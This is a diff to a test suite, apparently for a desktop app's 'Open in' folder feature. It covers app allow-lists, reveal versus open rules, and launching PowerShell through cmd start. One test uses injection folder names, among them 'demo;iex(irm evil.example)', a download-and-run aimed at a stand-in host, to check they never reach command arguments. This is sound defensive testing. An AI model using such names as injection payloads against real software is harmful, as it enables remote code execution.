@@ -103,6 +103,8 @@ test("only the applications Open in offers may open a folder", () => {
   }
   expect(isOpenWithApp("python3", "darwin")).toBe(false)
   expect(isOpenWithApp("powershell", "darwin")).toBe(false)
+  // Only the exact name reaches the PowerShell launch.
+  for (const app of ["PowerShell", "pwsh", "powershell.exe"]) expect(isOpenWithApp(app, "win32")).toBe(false)
   expect(isOpenWithApp("code", "freebsd")).toBe(false)
 })
 
@@ -112,6 +114,12 @@ test("reveals .jar on every platform, .py on macOS and the newer Windows package
   expect(localFileAction("/tmp/tool.jar", file, "linux")).toBe("reveal")
   expect(localFileAction("/tmp/script.py", file, "darwin")).toBe("reveal")
   expect(localFileAction("/tmp/script.py", file, "linux")).toBe("open")
+  // A project folder named like a launcher still opens off Windows; bundles such as .app stay revealed.
+  const folder = { isDirectory: true, mode: 0o755 }
+  expect(localFileAction("/work/discord.py", folder, "darwin")).toBe("open")
+  expect(localFileAction("/work/x.jar", folder, "darwin")).toBe("open")
+  expect(localFileAction("/work/x.jar", folder, "linux")).toBe("open")
+  expect(localFileAction("/Applications/X.app", folder, "darwin")).toBe("reveal")
   for (const extension of [
     ".searchconnector-ms",
     ".desktopthemepackfile",
@@ -123,16 +131,18 @@ test("reveals .jar on every platform, .py on macOS and the newer Windows package
     expect(localFileAction(`C:\\x\\a${extension.toUpperCase()}`, file, "win32", ".EXE")).toBe("reveal")
 })
 
-test("Open in PowerShell starts in the folder and never puts it on the command line", () => {
+test("Open in PowerShell starts it in the folder through cmd start and never puts the folder in an argument", () => {
   const powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-  for (const name of ["demo;iex(irm evil.example)", "x$(calc)", "my project", "plain"]) {
+  for (const name of ["demo;iex(irm evil.example)", "x$(calc)", "a & b", "my project"]) {
     const folder = path.win32.join("C:\\work", name)
-    const launch = openWithLaunch("powershell", folder, powershell, "win32")
-    expect(launch.command).toBe(powershell)
-    expect(launch.args).toEqual(["-NoExit"])
-    expect(launch.args.some((arg) => arg.includes(name))).toBe(false)
-    expect(launch.options).toEqual({ cwd: folder, detached: true, stdio: "ignore" })
+    const launch = openWithLaunch("powershell", folder, powershell, "win32", "C:\\Windows")
+    expect(launch.command).toBe("C:\\Windows\\System32\\cmd.exe")
+    expect(launch.args).toEqual(["/d", "/c", "start", "", powershell, "-NoExit"])
+    expect(launch.args.some((arg) => arg.includes(name) || arg.includes("C:\\work"))).toBe(false)
+    expect(launch.options).toEqual({ cwd: folder, windowsHide: true })
   }
+  // Never a bare `cmd` found through PATH.
+  expect(() => openWithLaunch("powershell", "C:\\work", powershell, "win32", "")).toThrow()
 })
 
 test("Open in an editor passes the folder as its one argument, and macOS uses open -a", () => {
